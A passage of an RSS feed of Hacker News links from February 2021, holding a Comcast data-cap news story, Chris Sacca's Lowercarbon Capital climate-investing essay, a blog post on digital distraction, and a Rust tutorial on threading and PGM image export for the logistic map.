<a href="https://www.facebook.com/thedetechtor" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.youtube.com/channel/UCAW--4_mML4A86W3670ix3w" target="_blank" rel="noopener"><u>Youtube</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.thedetechtor.com/post/altstore-on-ios</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134234</guid>
            <pubDate>Sun, 14 Feb 2021 17:33:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Psychology Beyond Technocracy: Marshall McLuhan and the ‚ÄúMeaning Crisis‚Äù [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26134134">thread link</a>) | @tacon
<br/>
February 14, 2021 | http://www.digitallife.center/images/Dianoetikon/Psychology-Beyond-Technocracy_Dianoetikon.pdf | <a href="https://web.archive.org/web/*/http://www.digitallife.center/images/Dianoetikon/Psychology-Beyond-Technocracy_Dianoetikon.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.digitallife.center/images/Dianoetikon/Psychology-Beyond-Technocracy_Dianoetikon.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134134</guid>
            <pubDate>Sun, 14 Feb 2021 17:23:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comcast Backs Off Plan to Impose New Fees on Heavy-Duty Internet Users]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26134040">thread link</a>) | @CapitalistCartr
<br/>
February 14, 2021 | https://jcitytimes.com/comcast-backs-off-plan-to-impose-new-fees-on-heavy-duty-internet-users/ | <a href="https://web.archive.org/web/*/https://jcitytimes.com/comcast-backs-off-plan-to-impose-new-fees-on-heavy-duty-internet-users/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="pico"><h3>Cable-company criticized for asking customers to pay more during public-health emergency, when high-speed internet is critical to students, some employees</h3><p><em>This story was written and produced by NJ Spotlight. It is being republished under a special NJ News Commons content-sharing agreement related to COVID-19 coverage. To read more, visit njspotlight.com.</em></p><p><em>Full story link ‚Äì <a href="https://www.njspotlight.com/2020/06/we-cant-unsee-racial-inequities-in-nj-made-clear-by-covid-19-whats-the-plan-to-address-them/" target="_blank" rel="noopener noreferrer">HERE</a>.</em></p><p data-autoattached="true">By Tom Johnson</p><p>Comcast is postponing until July its plan to impose new fees on customers who are heavy users of its internet services after widespread criticism for proposing to increase bills during a public-health emergency.</p><p>The postponement came after pressure from lawmakers and consumer advocates. They argued such a step was inappropriate at a time when many students and others are relying heavily on the internet because of the coronavirus pandemic. The cap on data use was effective Jan. 1 for Comcast customers in the Northeast region, including New Jersey,</p><p>In New Jersey, lawmakers have introduced legislation (<a href="https://bf1f7a75-24f0-4a30-89f1-4410f141a906/v" target="_blank" rel="noopener">S-3410</a>) that would prevent internet service providers from increasing rates during a public-health emergency. In Pennsylvania, the state‚Äôs attorney general‚Äôs office secured a commitment last week from Comcast, a Philadelphia-based cable company, to delay imposing the new fees on data usage to current customers there and throughout the Northeast.</p><p>The plan calls for a monthly data-usage cap of 1.2 terabytes. If customers exceed the data limit, they could be charged anywhere from $10 to $100 on top of their existing bills, depending on their data usage. Comcast began monitoring customers‚Äô data usage at the beginning of the year, but had held off imposing the fees until March.</p><h3>‚ÄòUnconscionable‚Äô to levy an extra fee</h3><p>‚ÄúDuring the COVID-19 pandemic, it is unconscionable for a cable company to levy an extra fee for using their internet,‚Äô‚Äô said Sen. Nicholas Scutari (D-Union), the sponsor of the bill in the New Jersey Legislature. ‚ÄúRight now people are relying on their home internet more than ever ‚Äî for work, for their children to attend school, to shop for groceries and to schedule COVID-19 testing and vaccinations.‚Äô‚Äô</p><p>The legislation, introduced a week ago, has not yet moved in either house of the Legislature.</p><p>In a news release, Comcast said it is delaying imposition of the new fees for six months to provide its customers in the Northeast time to familiarize themselves with the data-usage plan and their service options.</p><p>The company said the new limit on data usage only affects a ‚Äúvery small percentage of its customers.‚Äô‚Äô Comcast is also giving its low-income customers some help by doubling the speed for those who subscribe to its Internet Essentials service and not imposing data limits on that plan for the rest of the year. In addition, the company is waiving early termination fees for customers who do not want to be subject to caps on data usage.</p><p>In New Jersey, the state Board of Public Utilities has received some complaints from customers about the new fee but is unable to take action because it does not regulate internet service, according to Peter Peretzman, a spokesman for the agency. There are no plans to investigate the problem, he added.</p><p><em>Photo by <a href="https://unsplash.com/@nasa?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">NASA</a> on </em><a href="https://unsplash.com/s/photos/internet?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"><em>Unsplash</em></a></p></div></div></div>]]>
            </description>
            <link>https://jcitytimes.com/comcast-backs-off-plan-to-impose-new-fees-on-heavy-duty-internet-users/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26134040</guid>
            <pubDate>Sun, 14 Feb 2021 17:13:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chris Sacca's Act 2: Lowercarbon Capital]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 51 (<a href="https://news.ycombinator.com/item?id=26133941">thread link</a>) | @simonebrunozzi
<br/>
February 14, 2021 | https://lowercarboncapital.com/act2/ | <a href="https://web.archive.org/web/*/https://lowercarboncapital.com/act2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>
<div>
<div><figure><img loading="lazy" src="https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=1292%2C808&amp;ssl=1" alt="" width="1292" height="808" srcset="https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?w=1723&amp;ssl=1 1723w, https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=300%2C188&amp;ssl=1 300w, https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=1024%2C640&amp;ssl=1 1024w, https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=768%2C480&amp;ssl=1 768w, https://i0.wp.com/lowercarboncapital.com/wp-content/uploads/2021/02/leslie-cross-bWYTWRx9yRM-unsplash2-e1612971496415-edited-2.jpg?resize=1536%2C960&amp;ssl=1 1536w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>
</div>
</div>







<p><em>Because we‚Äôve run the numbers, and shit‚Äôs not great</em>.</p>







<p>Four years ago, Crystal and I retired from venture capital to carve out more time for things that matter, with Earth‚Äôs climate disaster at the top of the list. Why? The situation is much worse than it seems. The planet is warming faster than experts predicted. Rising temperatures fuel lethal heat waves, year-round fires, destructive storms, and epic droughts that are already killing thousands of people around the globe, displacing millions more, and sowing the seeds of famine, disease, and war. Heavy stuff.</p>



<p>Academic debates about exactly how many degrees the planet will warm, which species will go extinct, how many millions of people will be killed by extreme weather, which wars and refugee crises will result from drought, and whether sea levels will rise 10, 20, or 30 feet all miss the point. The bottom line is the planet is becoming unlivable. If you‚Äôre the quantitative type, well, we drew some samples, crunched a few numbers and, according to our exact scientific calculations: A lot of shit will be pretty fucked up.</p>



<p>In simplest terms, more carbon equals more heat, and more heat equals more death. This is an established and unavoidable fact. Today, the levels of CO<sub>2</sub> in the atmosphere are higher than at any point in at least 800,000 years (and arguably as far back as 23 million). Pumping all this CO<sub>2</sub> into the sky is like locking ourselves in a car on a sunny day.</p>







<h2><span>What will it take to get us out of this nightmare? </span></h2>



<p>Electric cars and solar panels are awesome but only a part of the picture. To bring down CO<sub>2</sub> in the atmosphere it will take:</p>



<blockquote><p><span><span>01</span></span>   Slashing new emissions of CO<sub>2</sub> and other greenhouse gases to zero.</p><p><span><span>02</span></span>   Sucking up at least a trillion tons of carbon already swirling around the sky.</p><p><span><span>03</span></span>   Buying all of humanity, including those most vulnerable, more time by actively cooling the planet.</p></blockquote>



<p>I am not new to this challenge. Way back when I was at Google, I was tasked with leading many of the company‚Äôs clean energy deals, repping execs in meetings with policy groups and think tanks, and exploring innovative ways to use technology to reduce the carbon footprint of a company that was, at the time, rumored to the be the largest individual power consumer in two or three US states. (If saying that violates my Google NDA, then no, we definitely weren‚Äôt a massive user of electrical power. Nothing to see here.)</p>



<p>In the years that followed, Crystal and I have been active supporters of legislative and regulatory efforts to address the problems, as well as funders of philanthropy and activism in the climate space. We‚Äôve been poking around academic labs, comparing notes with environmental non-profits, briefing political leaders, cajoling philanthropists, sponsoring research and primers, and advising companies concerned about the climate emergency.&nbsp;</p>



<p>After almost 20 years of this work, here is what we know to be true:</p>



<p><strong>Policy change alone ain‚Äôt gonna get us there.</strong> High fives to everyone who is working on clean tech regulatory initiatives. This vital work brings down real costs, creates research breakthroughs, and keeps urgent climate issues front and center. But even the most aggressive ideas on the table today fall short of the drastic action needed.&nbsp;</p>



<p><strong>Guilt and shame don‚Äôt and won‚Äôt change anything at scale. </strong>There simply aren‚Äôt enough people willing to buy more expensive products nor companies on board with overpaying for sustainable materials just because they feel bad. Cheers to consumers and companies that spend a little more to choose options with climate in mind. You‚Äôve undoubtedly helped create a new generation of climate friendly companies. However, we need about seven billion more of you to get on board before the impact will be meaningful enough.&nbsp;</p>



<p><strong>Philanthropy is way too small and cautious</strong>. For the better part of twenty years, climate philanthropy has been overwhelmingly focused on consumer awareness campaigns to persuade people that climate change is real and to turn out their lights. But there‚Äôs been too little appetite to invest in hardcore, massive change. Bless you and those paper straws, but unless we zero out the billions of tons of CO<sub>2</sub> emissions from huge sectors like aviation, steelmaking, industrial chemicals, building, and farming, we are screwed.</p>



<p>So, policy, philanthropy, and individual behavior do have roles to play, but the real solutions to the carbon nightmare will win because they‚Äôre cheaper, better, faster, stronger, simpler, and just plain cooler than what‚Äôs available today.&nbsp;</p>



<p>Markets already understand that it‚Äôs too damn expensive to keep powering our economy by digging up and burning old dinosaur bones. In most places today, solar and wind are cheaper and scale faster. What you might not know yet is that technologies that grow chemicals in bioreactors or boost crop yields are already outperforming 100-year-old industrial processes that are dirty and dangerous. We see this happening in protein, transportation, chemicals, building materials, and even mining too. This radical shift isn‚Äôt just because of some warm and fuzzies. These are real businesses, with insane growth, and some posting nine-figure revenue run rates.</p>



<p>We‚Äôre on a clear trajectory to 8.5 billion people on this planet. I‚Äôm going out on a limb and predict they‚Äôll want to eat, build houses, go places, buy stuff, and enjoy life. Fair to say? The most profitable companies meeting this demand will be those that sell products and services that use less carbon because they are ultimately the cheapest to offer. In simple terms, cutting gigatons of CO<sub>2</sub>, mass market adoption, and generating piles of money will go hand-in-hand.</p>







<h2><span>Who knew we would look forward to email?</span></h2>



<p>When the word got out that we were starting to dig into climate tech, our inboxes blew up. Notes came in from very small and unreasonably ambitious teams taking on intimidatingly large projects to slash CO<sub>2</sub> emissions and suck carbon right out of the air. Frankly, we‚Äôve never felt so energized reading our email. It was everything we loved about startups colliding with all of the urgency we felt for helping a planet on fire.&nbsp;</p>



<p>There is also a dynamic that makes climate tech today different from clean tech 15 years ago. It reminds me of the dramatic shift in startup economics that made YCombinator and its companies possible. Back then, the rise of open-source coding tools, cloud hosting, and the elimination of legal and financing friction empowered a new type of company and a new type of company-builder. The old way required millions of dollars and a rash of bankers and lawyers to even consider writing the first line of code. Suddenly startups had tiny, ragtag teams, usually without any fancy MBAs on board, raising tens to hundreds of thousands of dollars for services and apps that they built and launched within weeks.</p>



<p>In climate tech, we have seen the same evolution. I appreciate the investors who have been plowing money into this stuff for decades and I admire their passion and commitment to doing the right thing. But, too often low-carbon businesses were among the most expensive to start. CapEx was bonkers right out of the gate, and most companies relied upon government intervention to even approach viability.</p>



<p>Are we excited to see the Biden/Harris administration finally at the wheel? Hell yes. They believe in science and have made climate a priority across the entire federal government. We have the deepest respect for Secretary Kerry and Gina McCarthy, and we admire the depth of expertise and hustle we are seeing across the staffers accepting roles to serve the USA to advance climate work. As members of Climate Leaders for Biden, and as a consequence of our involvement across the industry, we have already been in close touch with the administration and we are beyond heartened to see how serious they are about climate. Multiple times, Crystal and I have spoken directly with President Biden about climate and I can assure you he gets the gravity and urgency of the moment. Yet, despite all that, we aren‚Äôt counting on the government‚Äôs direct help in our investment thesis. Why?</p>



<p>Today, with shared lab space, massive computing clusters available for rent, proliferation of machine learning, cheap renewable electricity, the discovery of CRISPR/Cas9, breakthroughs in electrochemistry, and more streamlined tech transfer from universities, true seed-stage climate tech startups are possible at scale. Some benefit from grants and government investment, and no doubt healthy public investment in research and science lifts all boats, but barely any of these climate tech companies count on governments for handouts because they increasingly can rely upon free markets to reward them with customers. Add to this what might be the first generation of hard science engineers who, inspired by a prior, similar shift in computer science academia, now go to school knowing from day one they want to graduate to directly become company founders. These teams are taking their innovations straight to consumers and enterprises who may not vote for the same people nor share the same climate values, but who buy their products and services because they are just simply cheaper and better.&nbsp;&nbsp;</p>







<h2><span>We call this thing Lowercarbon Capital.</span></h2>



<p>It wasn‚Äôt in the master plan to get back into the investing world full-time. But after a few years of doing this work, we picked up our heads and realized we now have a portfolio of over 30 climate teams and growing.&nbsp;</p>



<p>Our startups straddle a delicate line between, ‚ÄúWhaaa? That‚Äôs absolutely bananas!‚Äù to, ‚ÄúNo way. Are you f‚Äôing kidding me?!‚Äù You know, chill stuff like confining plasma that‚Äôs hotter than the sun or growing full-on real meat steaks in a vat. Maybe using microbes to make hundreds of millions of dollars of industrial chemicals is your thing, or you‚Äôre into kelp-growing robots in the high seas. I‚Äôm kinda partial to ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lowercarboncapital.com/act2/">https://lowercarboncapital.com/act2/</a></em></p>]]>
            </description>
            <link>https://lowercarboncapital.com/act2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133941</guid>
            <pubDate>Sun, 14 Feb 2021 17:02:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anti-Money Laundering in Italy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26133938">thread link</a>) | @onurergr
<br/>
February 14, 2021 | https://www.regtechtime.com/guide/anti-money-laundering-in-italy-regulations-and-requirements/ | <a href="https://web.archive.org/web/*/https://www.regtechtime.com/guide/anti-money-laundering-in-italy-regulations-and-requirements/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.regtechtime.com/guide/anti-money-laundering-in-italy-regulations-and-requirements/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133938</guid>
            <pubDate>Sun, 14 Feb 2021 17:02:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Age of distractions ‚Äì or how to calmly enjoy what you are doing in 2021]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26133769">thread link</a>) | @iamsanteri
<br/>
February 14, 2021 | https://www.lostbookofsales.com/age-of-distractions/ | <a href="https://web.archive.org/web/*/https://www.lostbookofsales.com/age-of-distractions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://www.lostbookofsales.com/content/images/size/w300/2021/02/lbs-distractions-santeri-liukkonen.jpg 300w,
                            https://www.lostbookofsales.com/content/images/size/w600/2021/02/lbs-distractions-santeri-liukkonen.jpg 600w,
                            https://www.lostbookofsales.com/content/images/size/w1000/2021/02/lbs-distractions-santeri-liukkonen.jpg 1000w,
                            https://www.lostbookofsales.com/content/images/size/w2000/2021/02/lbs-distractions-santeri-liukkonen.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://www.lostbookofsales.com/content/images/size/w2000/2021/02/lbs-distractions-santeri-liukkonen.jpg" alt="Age of distractions">
            </figure>

            <section>
                <div>
                    <p>The book is exciting and the story is funny. In fact, I'm learning something new. So much so, that I keep writing down my ideas and shuffling their implications. And suddenly, I realize something. In the past 15-minutes, I've only managed to cover three pages and I'm already thinking about next things I'm supposed to do. Cleaning, picking-up the groceries, doing my excercises, writing a couple of lines of code, watching a movie... </p><p>Is this supposed to be my Saturday off work?</p><p>So I stop and think. When was the last moment that took longer than 10 seconds, where I didn't have an urge to check an app on my phone, see if I got new email, or impulsively do something else?</p><p>By now, where I live, it's been many months of nightly curfews and limitations on travel and social life. I consider myself a very fortunate person to have suffered a relatively small impact from the global pandemic. Nonetheless, I can't stop but think about why my mind feels so exhausted while at the same time requiring a constant stream of stimulus that results in overbearing distraction. </p><p>It was already before the pandemic that I heard my colleagues talking about "<a href="https://en.wikipedia.org/wiki/Digital_detox"><em>digital detox</em></a>" and discussing their efforts to break out of being constantly connected while trying to regain their energy and allowing for some rest. Thus, I surely know that I'm not alone with these thoughts. </p><p>Finally, after subscribing to <a href="https://amzn.to/3alEC3u">Audible</a> last summer, there only remains little time in my day when I am not stimulating my brain in one way or another. It was some sort of a panic that hit me when I realized that I am no longer able to enjoy a thing that I've always enjoyed so much, reading a great book at length. </p><p>Today I called with a good friend of mine and he said: </p><p><em>"Yeah right! It's like we must constantly be multitasking or something... Even when I get to playing a Playstation game and it starts to load, I just all the time have to unlock my phone and check what is going on..."</em></p><h2 id="to-observe-and-reflect">To observe and reflect</h2><p>I recently read <a href="https://www.lostbookofsales.com/notes/the-almanack-of-naval-ravikant-by-eric-jorgenson/amp/">a book where Naval describes</a> what meditation means for him, and I cannot help but agree with his way of putting it. </p><p>One only needs to stop and observe his thoughts in a calm state. Your mind is like a monkey in a room, misbehaving and throwing feces all over the walls. It is fascinating how you realize this while trying to focus on your breath and not let your thoughts wander. In a matter of seconds, however, you already catch yourself thinking about entirely something different. When practicing to focus your attention and letting your thoughts pass, this inner monkey seems to eventually calm down and let you achieve a little peace of mind. It is not so easy. </p><figure><img src="https://www.lostbookofsales.com/content/images/2021/02/santeri-drawing-LBS-1.jpg" alt=""><figcaption>One year into the global pandemic - SL 2020 (LBS)</figcaption></figure><p>After so many months of being limited with our social interactions, it feels like the scariest thing out there is to be left by ourselves. Especially us young people tend to handle this quite badly. Without typical distractions and mental stimulus available throughout our days, our mind starts to seek for something to occupy itself resulting in raised anxiety levels and stress. We are today forced to confront our inner selves like never before. </p><h2 id="so-what">So what?</h2><p>Billions of dollars are invested and brightest specialists are hired each year to engineer new distractions. They fight for every second of our limited attention spans, leading us further astray without us even noticing it. </p><p>When shortest breaks require distraction and only the rarest moments, such as taking a shower, offer a refuge from our electronic devices, how are we supposed to work towards our long-term goals? The type of goals that can only be achieved when managing to work in a state of sustained attention? Rarely do great things in life come in a form of neatly packaged gratification to which we are getting more and more accustomed to. </p><p>Reading reports and hearing on the radio that the general feeling and wellbeing in our societies during these challenging times is again on decline, constant distractions might truly be the enemy that stands in our way of what we ought to achieve.</p><h2 id="fighting-back">Fighting back</h2><p>At some point I read that <a href="https://qz.com/1476157/overworked-south-koreans-are-finding-solace-in-a-fake-prison/">South Koreans already pay to live in a hotel-like "prison"</a> to relieve themselves from digital devices. I'm not quite ready to go that far just yet. </p><p>Admittedly, a cottage in the middle of nowhere in Finland would be the way to go anyways.</p><figure><img src="https://www.lostbookofsales.com/content/images/2021/02/santeri-mikkeli-LBS.jpg" alt=""><figcaption>Late autumn lakeside view - Year 2016, Finland</figcaption></figure><p>Once upon a time before the pandemic I saw a colleague of mine use his phone as we were picking up lunch, and I couldn't help but ask why was the screen black and white? He told me he does it intentionally to make his handset less attractive, resulting in less tapping around. That struck me as bizarre. How odd, do we really need to resort to such approaches? </p><p>So what were some of the smaller changes I did to improve my wellbeing? </p><p>Unlike South Koreans with their voluntary confinement, or my friend with his greyscale screen, I started with some less drastic measures. These small changes proved enormously helpful. </p><p>First of all, I opened the screen-time function on my phone and looked through apps that sent me most notifications, proceeding to drastically dial them back. Today, most phones have a feature to limit the screen-time of apps, locking you out after a certain amount of time has passed. This function is plain useless for me or my friends whom I've seen to just enter their pin every single time they wanted to do something. What I did instead was that I just plain and simply uninstalled Instagram. </p><p>I had contemplated to delete it for a long time and almost did it, but instead always settled to just disable the notifications. When I finally did this however, two interesting realizations struck me. </p><p>First thing was that during the initial couple of weeks without the app I was totally surprised at how little I missed it. It literally had never provided me with anything of value, and I only used it to post an occasional update. Why didn't I uninstall it earlier? There was no feeling of missing out. Wow, this realization echoed a feeling that I had after uninstalling 9GAG many years earlier. </p><p>Second, I didn't even notice how those colorful icons on the home-screen invited me to tap on their respective apps as soon as I found myself aimlessly scrolling through my phone. I understood this in a particularly strong way after hiding another app, LinkedIn. Being an important tool for my work, all I did in addition to hiding it from the homescreen was to disable the last types of notifications I ever received from them. Lo' and behold, I now use this application significantly less and it makes a whole world of a difference. </p><p>Simple, easy and fast. Your life will be better for it, just try! Exponential returns of joy are expected if you have apps like Tiktok, Clubhouse, Snapchat, or other such platforms installed or bookmarked, that you can easily subject to the same fate and never look back.</p><p>So far, I'm mostly talking about my precious free time. But what could be some simple and small things that I could do when I'm working on my projects? </p><h2 id="focus-operate-and-enjoy-the-results">Focus, operate and enjoy the results</h2><p>I've written about doing <a href="https://www.lostbookofsales.com/why-to-do-lists-often-stink-and-how-do-the-truly-successful-people-maintain-their-productivity/">an experiment and turning myself into a productivity monster</a> back in 2017, and I've recently re-read the post and carefully re-implemented some of my learnings this year. But then again, it's not about going radical, but rather focusing on some small things that are easy to implement. </p><p>Kill the unnecessary Slack and Teams notifications now! Adjust the surprisingly good defaults that Slack provides and make sure none of them, except for the most important notifications, hit your phone after your working hours are over. </p><p>Use effective time-blocking techniques like <a href="https://alphaefficiency.com/20-minutes-pomodoro-weekly-experiment/">Pomodoro</a> for the less pleasant and repetitive, but still important tasks. This, like many other things, I've also learned from one of my colleagues using it in an effective manner.</p><p>Oh, and of course make sure to consider the following crazy important golden rule of life and the universe:<strong> </strong>don't do anything else while having a one-on-one interaction with someone else. Just never do this. </p><p>I catch myself with this one sometimes and no matter how small of a signal, it can still tell something to my counterpart. Such mistakes during limited and valuable interactions in these pandemic-ridden times can eat away from our important professional relationships. When having conversations, focus on them fully and wholeheartedly. Multitask when the time is right. </p><p>Oh, and try drinking less coffee in the mornings while cutting the alcohol in the evenings, but you've heard this a million times before. Additionally, to all of you who have small kids at home, I truly salute your efforts and patience with getting through with this! </p><h2 id="the-most-desired-skill-of-the-future">The most desired skill of the future</h2><p>What if the most sought after and desired skill of the future will be the ability to best manage our constant distractions and maintain a sustained state of productive focus? </p><p>If we can't manage to control our whims, we won't be able to work effectively towards our long-term goals. I guess it's just that simple. </p><p>The first step is to stop and observe. </p><p>Reflection and brutal honesty with oneself while trying to understand what is happening is critical before driving corrections and adjustments into one's behavior. As our society adjusts to challenges posed by global pandemics, there is a chance for us to walk out of this stronger than before. This is a chance for us to learn more about ourselves than would've otherwise been possible, right? </p><p>I'm only trying to think about something positive in these pandemic-ridden times.</p><p>Now let's get back to work...</p><hr><p><em>Author's comment:</em></p><div><p><em>If you enjoyed this post, consider subscribing for an occasional update. Being hand-made, they'll only serve to make your life a little bit richer. Worst case, you'll be able to unsubscribe at any time </em>üòâ<em> </em></p><p><em>See you around! </em></p></div><p><em>-S</em></p>
                </div>
            </section>

 ‚Ä¶</article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lostbookofsales.com/age-of-distractions/">https://www.lostbookofsales.com/age-of-distractions/</a></em></p>]]>
            </description>
            <link>https://www.lostbookofsales.com/age-of-distractions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133769</guid>
            <pubDate>Sun, 14 Feb 2021 16:41:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zero dependency images (of chaos) in Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26133713">thread link</a>) | @AlexeyBrin
<br/>
February 14, 2021 | https://state.smerity.com/smerity/state/01EYB6YQ5T2KFSC1PF55A3B8DG | <a href="https://web.archive.org/web/*/https://state.smerity.com/smerity/state/01EYB6YQ5T2KFSC1PF55A3B8DG">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="markdown">
      <p>One of the most upvoted posts on the Rust subreddit has been "<a href="https://www.reddit.com/r/rust/comments/jyziio/a_fractal_i_rendered_with_rust_without_any/">A fractal I rendered with rust without any external libraries</a>". Whilst the output is beautiful there was a minor complaint - zero dependencies still included <a href="https://crates.io/crates/tokio">Tokio</a>, <a href="https://crates.io/crates/image">image</a>, and <a href="https://crates.io/crates/rand">rand</a>!</p>

<p>In recent days I had a desire to recreate my experience of <a href="https://twitter.com/Smerity/status/974849365075374082">an early foray into numerical computing</a>. Rust seemed like an obvious candidate!</p>

<p>I decided to use the opportunity to replicate two aspects with zero dependencies: parallel computation and image export. The approaches used will be anything but optimal but may be of use to others writing fractal visualizers, scanline renderers, raytracers, and other graphical projects that benefit from being "from the ground up".</p>

<p>To follow along or run the code yourself, see <a href="https://github.com/Smerity/bifurcate-rs">the GitHub repository</a>.</p>

<h2>In brief: chaos and the logistic map</h2>

<p>Rather than fractals we'll be playing with chaos by producing a plot - a <a href="https://en.wikipedia.org/wiki/Bifurcation_diagram">bifurcation diagram</a>, specifically <a href="https://en.wikipedia.org/wiki/Logistic_map">the logistic map</a>. This diagram represents the behaviour of a simple equation, \(x_{t+1} = rx_t(1 - x_t)\), repeated over and over.</p>

<p>For certain values of <code>r</code> (such as between 2.4 and 3) the resulting series of values for <code>x</code> converges to a single number. Beyond 3 however the result gets quite interesting. The series of values for <code>x</code> dance around a small but growing set of points.</p>

<p>With the help of the Python terminal:</p>

<pre><code>&gt;&gt;&gt; r = 3.2
&gt;&gt;&gt; 0.5
0.5
&gt;&gt;&gt; r * _ * (1 - _)
0.8
&gt;&gt;&gt; r * _ * (1 - _)
0.512
&gt;&gt;&gt; r * _ * (1 - _)
0.7995392
&gt;&gt;&gt; r * _ * (1 - _)
0.512884056522752
&gt;&gt;&gt; r * _ * (1 - _)
0.7994688034800593
&gt;&gt;&gt; r * _ * (1 - _)
0.5130189943751092
&gt;&gt;&gt; r * _ * (1 - _)
0.7994576185134749
&gt;&gt;&gt; r * _ * (1 - _)
0.5130404310855622
</code></pre>

<p>Here we see that for <code>r = 3.2</code> the series of values for <code>x</code> bifurcates (forks or splits) between 0.799 and 0.513.</p>

<p>What might this look like if we sweep across the range of values for <code>r</code> and keep track of a <a href="https://en.wikipedia.org/wiki/Heat_map">heat map</a> of where the resulting points end up?</p>

<p>For more on the "chaotic" aspect of the logistic map, many others in the Rust community suggested <a href="https://www.youtube.com/watch?v=ovJcsL7vyrk">Veritasium's video</a>.</p>

<h2>Multi-threading for speed</h2>

<p>In graphic generation tasks such as fractal rendering or ray tracers, the task is easily sped up by adding more computational power (see: <a href="https://en.wikipedia.org/wiki/Embarrassingly_parallel">embarrassingly parallel</a>).</p>

<p>Threads are the simplest way of taking advantage of multiple cores. Each thread can be given a small chunk of work and then the underlying operating system shuffles it across the physical CPUs available to you.</p>

<pre><code>// Each step of the loop will farm work out to upwards of NTHR threads
for chunk in (0..RESX).collect::&lt;Vec&lt;usize&gt;&gt;().chunks(NTHR) {
    let mut threads = vec!();

    // Each thread creates a slice of the image, fills it using the `bifurcate` function, then returns the slice
    for x in chunk {
        let handle = thread::spawn(move || {
            let mut slice: Vec&lt;u32&gt; = vec!(0; RESY);
            bifurcate(&amp;mut slice);
            slice
        });
        threads.push(handle);
    }

    // Once all the threads are spawned we then retrieve the `slice` result from them in order
    // `into_iter` is necessary as it may yield (T, &amp;T, &amp;mut T) vs iter (&amp;T) and JoinHandles are not Copy-able
    let slices = threads.into_iter().map(|x| x.join().unwrap());
    img.extend(slices);
}
</code></pre>

<p>Is this better than <code>tokio</code>, <code>crossbeam</code>, or <code>rayon</code>? Absolutely not. Does it work well enough for our task? Absolutely.</p>

<p>The main disadvantage here is that we're assuming each of the blocks of work are similarly sized. For our task we know this will be true. If the tasks have a high degree of variability however we're likely to "starve" our CPUs - easy threads finish early and leave only one or two "hard" threads worth of work.</p>

<p>When running with N threads on an Intel i7-1065G7 processor with 4 CPUs and 8 hyperthreads:</p>

<ul>
<li>1 thread: 38.9 seconds</li>
<li>2 threads: 21.4 seconds</li>
<li>4 threads: 17.1 seconds</li>
<li>8 threads: 9.8 seconds</li>
</ul>

<h2>Exporting images: the Portable GrayMap (PGM)</h2>

<p>Exporting images as either grayscale or RGB is a basic requirement for any graphical application.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Netpbm#PGM_example">PGM format</a> is the simplest way of producing an image, representing the pixels in a standard space delimited text format. If you're interested in colour you can look to the Portable PixMap (PPM) as well.</p>

<p>Rather than performing anti-aliasing in the application itself we'll be exporting at a higher resolution and then downsampling.</p>

<h3>Converting from PGM to PNG</h3>

<p>To convert a PGM image to a more standard format such as PNG we can use <a href="https://en.wikipedia.org/wiki/ImageMagick">ImageMagick</a>. The file names are what set the format and we can specify downsampling but setting a lower resolution than what we produce.</p>

<p><code>convert -resize 2160x1440 img.pgm img.png</code></p>

<p>Depending on your image viewer this might not be necessary for local use but will be definitely needed if you intend on sharing the images you produce with others. Eye of GNOME, the default on Ubuntu, supports PPM and PGM for example.</p>

<h2>What about rand?</h2>

